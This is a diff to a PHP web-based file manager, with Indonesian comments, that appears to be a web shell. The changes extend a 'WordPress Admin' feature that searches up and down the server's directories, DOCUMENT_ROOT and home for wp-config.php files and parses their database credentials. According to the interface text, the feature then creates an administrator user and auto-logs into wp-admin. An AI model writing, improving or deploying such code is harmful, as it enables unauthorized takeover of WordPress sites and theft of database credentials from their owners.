@@ -1357,78 +1357,150 @@ HTML;
 
 /* ========== WORDPRESS ADMIN ========== */
 /**
- * Cari wp-config.php dari DOCUMENT_ROOT (BFS).
- * Fallback: folder app jika DOCUMENT_ROOT kosong.
+ * Cari wp-config.php mulai dari lokasi FM saat ini.
+ * Urutan:
+ *  1) folder sekarang + naik parent (sampai root/FM_ROOT)
+ *  2) BFS ke bawah dari folder sekarang
+ *  3) fallback BFS dari DOCUMENT_ROOT / home FM
+ *
+ * @param int $limit max hasil
+ * @param string|null $startRel path relatif FM (state.path) atau absolut
+ * @return string[] full path wp-config.php
  */
-function fm_wp_find_configs($limit = 40) {
+function fm_wp_find_configs($limit = 40, $startRel = null) {
     $found = array();
     $seen = array();
     $add = function ($file) use (&$found, &$seen, $limit) {
-        if (count($found) >= $limit) return;
+        if (count($found) >= $limit) return false;
         $real = @realpath($file);
-        if (!$real || !is_file($real)) return;
-        if (strtolower(basename($real)) !== 'wp-config.php') return;
+        if (!$real || !is_file($real) || !is_readable($real)) return false;
+        if (strtolower(basename($real)) !== 'wp-config.php') return false;
         $k = strtolower(str_replace('\\', '/', $real));
-        if (!empty($seen[$k])) return;
+        if (!empty($seen[$k])) return false;
         $seen[$k] = 1;
         $found[] = $real;
+        return true;
     };
 
-    // Root utama = DOCUMENT_ROOT
-    $docroot = '';
-    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
-        $docroot = @realpath($_SERVER['DOCUMENT_ROOT']);
-    }
-    if (!$docroot || !is_dir($docroot)) {
-        // fallback: parent folder app (mis. htdocs)
-        $app = @realpath(dirname(__FILE__));
-        $docroot = $app ? dirname($app) : @realpath(dirname(__FILE__));
-    }
-    if (!$docroot || !is_dir($docroot)) return $found;
-
-    // cek langsung di document root
-    $add($docroot . DIRECTORY_SEPARATOR . 'wp-config.php');
-
-    // BFS seluruh isi DOCUMENT_ROOT
     $skip = array(
         'node_modules', '.git', 'vendor', 'cache', 'uploads',
         'wp-content', 'wp-includes', 'wp-admin', 'cgi-bin',
         'tmp', 'temp', 'logs', 'log', 'backup', 'backups',
         'node', 'bower_components', '.svn', '.hg',
+        'cache_html', 'min', 'wflogs',
     );
-    $q = array($docroot);
-    $depth = array($docroot => 0);
-    $guard = 0;
-    $maxDepth = 6;
-    $maxNodes = 8000;
 
-    while ($q && count($found) < $limit && $guard < $maxNodes) {
-        $guard++;
-        $dir = array_shift($q);
-        $d = isset($depth[$dir]) ? $depth[$dir] : 0;
-        $add($dir . DIRECTORY_SEPARATOR . 'wp-config.php');
-        if ($d >= $maxDepth) continue;
+    $bfs = function ($root, $maxDepth, $maxNodes) use ($add, $skip, $limit, &$found) {
+        if (!$root || !is_dir($root) || count($found) >= $limit) return;
+        $root = @realpath($root);
+        if (!$root) return;
+        $q = array($root);
+        $depth = array($root => 0);
+        $guard = 0;
+        while ($q && count($found) < $limit && $guard < $maxNodes) {
+            $guard++;
+            $dir = array_shift($q);
+            $d = isset($depth[$dir]) ? $depth[$dir] : 0;
+            $add($dir . DIRECTORY_SEPARATOR . 'wp-config.php');
+            // WP sering di parent folder publik — cek juga
+            if ($d >= $maxDepth) continue;
+            $list = @scandir($dir);
+            if (!$list) continue;
+            foreach ($list as $n) {
+                if ($n === '.' || $n === '..') continue;
+                if (isset($n[0]) && $n[0] === '.' && $n !== '.well-known') continue;
+                if (in_array(strtolower($n), $skip, true)) continue;
+                $full = $dir . DIRECTORY_SEPARATOR . $n;
+                if (@is_dir($full) && !@is_link($full)) {
+                    $rp = @realpath($full);
+                    if ($rp === false) continue;
+                    if (isset($depth[$rp])) continue;
+                    $q[] = $rp;
+                    $depth[$rp] = $d + 1;
+                }
+            }
+        }
+    };
 
-        $list = @scandir($dir);
-        if (!$list) continue;
-        foreach ($list as $n) {
-            if ($n === '.' || $n === '..') continue;
-            if (isset($n[0]) && $n[0] === '.' && $n !== '.well-known') continue;
-            if (in_array(strtolower($n), $skip, true)) continue;
-            $full = $dir . DIRECTORY_SEPARATOR . $n;
-            if (is_dir($full) && !is_link($full)) {
-                // skip folder app file manager sendiri (opsional, tetap boleh)
-                $q[] = $full;
-                $depth[$full] = $d + 1;
+    // ---- resolve folder mulai (lokasi FM sekarang) ----
+    $startDir = null;
+    if ($startRel !== null && $startRel !== '') {
+        $full = safe_path($startRel);
+        if ($full !== false) {
+            $startDir = is_dir($full) ? $full : dirname($full);
+            $startDir = @realpath($startDir);
+        }
+        // absolut di luar safe_path? coba realpath mentah jika under root
+        if (!$startDir) {
+            $try = @realpath($startRel);
+            if ($try && under_root($try)) {
+                $startDir = is_dir($try) ? $try : dirname($try);
+                $startDir = @realpath($startDir);
             }
         }
     }
+    if (!$startDir || !is_dir($startDir)) {
+        $home = fm_home_rel();
+        $hf = $home !== '' ? safe_path($home) : false;
+        if ($hf && is_dir($hf)) $startDir = $hf;
+    }
+    if (!$startDir || !is_dir($startDir)) {
+        $startDir = @realpath(dirname(__FILE__));
+    }
+    if (!$startDir) $startDir = FM_ROOT;
 
-    // sort: lebih dangkal / dekat docroot dulu
-    usort($found, function ($a, $b) use ($docroot) {
-        $da = substr_count(str_replace('\\', '/', $a), '/');
-        $db = substr_count(str_replace('\\', '/', $b), '/');
-        if ($da !== $db) return $da - $db;
+    // 1) Naik ke atas dari lokasi sekarang (paling relevan untuk WP)
+    $walk = $startDir;
+    $upGuard = 0;
+    while ($walk && $upGuard < 32 && count($found) < $limit) {
+        $upGuard++;
+        $add($walk . DIRECTORY_SEPARATOR . 'wp-config.php');
+        // kadang wp-config di parent saat kita di /public atau /httpdocs
+        $parent = @dirname($walk);
+        $parentReal = $parent ? @realpath($parent) : false;
+        if ($parentReal === false || $parentReal === $walk) break;
+        if (!under_root($parentReal) && fm_norm($parentReal) !== fm_norm(FM_ROOT)) {
+            // tetap boleh naik ke parent dekat start, tapi henti di luar FM_ROOT kecuali sama drive root
+            if (fm_norm(FM_ROOT) !== '/' && !preg_match('#^[A-Za-z]:$#', fm_norm(FM_ROOT))) {
+                break;
+            }
+        }
+        $walk = $parentReal;
+    }
+
+    // 2) BFS ke bawah dari lokasi sekarang
+    $bfs($startDir, 5, 4000);
+
+    // 3) Fallback: DOCUMENT_ROOT + home
+    $docroot = '';
+    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
+        $docroot = @realpath($_SERVER['DOCUMENT_ROOT']);
+    }
+    if ($docroot && is_dir($docroot)) {
+        $add($docroot . DIRECTORY_SEPARATOR . 'wp-config.php');
+        $bfs($docroot, 5, 5000);
+    }
+    $homeRel = fm_home_rel();
+    if ($homeRel !== '') {
+        $homeFull = safe_path($homeRel);
+        if ($homeFull && is_dir($homeFull) && fm_norm($homeFull) !== fm_norm($startDir)) {
+            $bfs($homeFull, 4, 3000);
+        }
+    }
+
+    // sort: dekat startDir dulu, lalu path lebih dangkal
+    $startNorm = str_replace('\\', '/', fm_norm($startDir));
+    usort($found, function ($a, $b) use ($startNorm) {
+        $na = str_replace('\\', '/', fm_norm($a));
+        $nb = str_replace('\\', '/', fm_norm($b));
+        $da = dirname($na);
+        $db = dirname($nb);
+        $aNear = (strpos($da, $startNorm) === 0 || strpos($startNorm, $da) === 0) ? 0 : 1;
+        $bNear = (strpos($db, $startNorm) === 0 || strpos($startNorm, $db) === 0) ? 0 : 1;
+        if ($aNear !== $bNear) return $aNear - $bNear;
+        $ca = substr_count($na, '/');
+        $cb = substr_count($nb, '/');
+        if ($ca !== $cb) return $ca - $cb;
         return strcasecmp($a, $b);
     });
 
@@ -2215,7 +2287,14 @@ if ($__fm_is_api) {
 
 
             case 'wp_find': {
-                $list = fm_wp_find_configs();
+                $here = trim((string)fm_arr($_POST, 'path', fm_arr($_GET, 'path', '')));
+                $list = fm_wp_find_configs(40, $here);
+                $startFull = safe_path($here);
+                if ($startFull === false) {
+                    $hr = fm_home_rel();
+                    $startFull = $hr !== '' ? safe_path($hr) : FM_ROOT;
+                }
+                if ($startFull && !is_dir($startFull)) $startFull = dirname($startFull);
                 $items = array();
                 foreach ($list as $f) {
                     $cfg = fm_wp_parse_config($f);
@@ -2227,17 +2306,24 @@ if ($__fm_is_api) {
                         'db_name' => $cfg ? $cfg['db']['name'] : '',
                     );
                 }
-                json_out(array('ok'=>true,'count'=>count($items),'items'=>$items));
+                json_out(array(
+                    'ok' => true,
+                    'count' => count($items),
+                    'items' => $items,
+                    'search_from' => $startFull ? $startFull : $here,
+                    'search_rel' => $here,
+                ));
             }
 
             case 'wp_admin': {
                 $path = trim((string)fm_arr($_POST, 'wp_config', ''));
+                $here = trim((string)fm_arr($_POST, 'path', ''));
                 $user = trim((string)fm_arr($_POST, 'username', ''));
                 $pass = (string)fm_arr($_POST, 'password', '');
                 $email = trim((string)fm_arr($_POST, 'email', ''));
                 if ($path === '') {
-                    $list = fm_wp_find_configs(5);
-                    if (!$list) json_out(array('ok'=>false,'error'=>'wp-config.php tidak ditemukan'), 404);
+                    $list = fm_wp_find_configs(5, $here);
+                    if (!$list) json_out(array('ok'=>false,'error'=>'wp-config.php tidak ditemukan di lokasi ini'), 404);
                     $path = $list[0];
                 }
                 $real = @realpath($path);
@@ -4191,15 +4277,20 @@ tr:hover .row-acts, tr.selected .row-acts { opacity: 1; }
     openModal({
       title: 'WordPress Admin',
       wide: true,
-      body: '<div style="padding:16px" id="wpBox"><div style="color:var(--muted)">Mencari wp-config.php…</div></div>',
+      body: '<div style="padding:16px" id="wpBox"><div style="color:var(--muted)">Mencari <code>wp-config.php</code> dari lokasi sekarang…</div></div>',
       confirmText: '',
       cancelText: 'Tutup'
     });
     var box = document.getElementById('wpBox');
-    api('wp_find').then(function (r) {
+    var herePath = (state && typeof state.path === 'string') ? state.path : (typeof FM_HOME === 'string' ? FM_HOME : '');
+    api('wp_find', { path: herePath }).then(function (r) {
       var items = r.items || [];
+      var from = r.search_from || herePath || '/';
       if (!items.length) {
-        box.innerHTML = '<div style="color:#f87171">wp-config.php tidak ditemukan.</div>';
+        box.innerHTML =
+          '<div style="color:#f87171;margin-bottom:8px">wp-config.php tidak ditemukan.</div>' +
+          '<div class="mono" style="font-size:11px;color:var(--muted)">Dicari dari: ' + esc(from) + '</div>' +
+          '<div style="margin-top:10px;font-size:12px;color:var(--muted)">Pindah ke folder instalasi WordPress (atau parent-nya), lalu buka WP Admin lagi.</div>';
         return;
       }
       var opts = items.map(function (it, i) {
@@ -4207,7 +4298,8 @@ tr:hover .row-acts, tr.selected .row-acts { opacity: 1; }
       }).join('');
       box.innerHTML =
         '<div class="set-hero" style="margin-bottom:14px"><div><strong>WORDPRESS ADMIN</strong>' +
-        '<p>Cari <code>wp-config.php</code>, buat user administrator, auto-login ke wp-admin.</p></div></div>' +
+        '<p>Cari <code>wp-config.php</code> dari lokasi FM sekarang (naik parent + turun folder), buat admin, auto-login wp-admin.</p></div></div>' +
+        '<div class="mono" style="font-size:11px;color:var(--muted);margin:-6px 0 12px">Lokasi cari: ' + esc(from) + ' · ' + items.length + ' ditemukan</div>' +
         '<div class="field"><label>Instalasi WordPress</label><select id="wpCfg">' + opts + '</select></div>' +
         '<div class="set-grid">' +
         '<div class="field"><label>Username (opsional)</label><input id="wpUser" placeholder="auto generate"></div>' +
@@ -4224,6 +4316,7 @@ tr:hover .row-acts, tr.selected .row-acts { opacity: 1; }
         btn.textContent = 'Memproses…';
         api('wp_admin', {
           wp_config: document.getElementById('wpCfg').value,
+          path: herePath,
           username: document.getElementById('wpUser').value,
           password: document.getElementById('wpPass').value,
           email: document.getElementById('wpEmail').value
